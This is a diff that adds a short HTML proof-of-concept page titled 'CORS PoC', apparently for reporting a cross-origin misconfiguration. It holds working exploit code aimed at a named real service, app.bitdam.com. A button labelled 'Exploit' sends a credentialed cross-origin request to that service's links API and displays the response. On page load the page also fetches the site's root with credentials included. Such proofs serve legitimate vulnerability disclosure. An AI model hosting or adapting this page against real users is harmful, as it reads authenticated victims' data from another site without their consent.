@@ -1,0 +1,25 @@
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <div id="beret"></div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 400) {
+                 document.getElementById("beret").innerHTML = this.responseText;
+                 }
+             };
+              xhr.open("GET",
+                       "https://app.bitdam.com/api/v1.0/links/rewrite_click", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+             fetch("https://app.bitdam.com/", {credentials: "include"});
+         </script>
+         
+     </body>
+ </html>
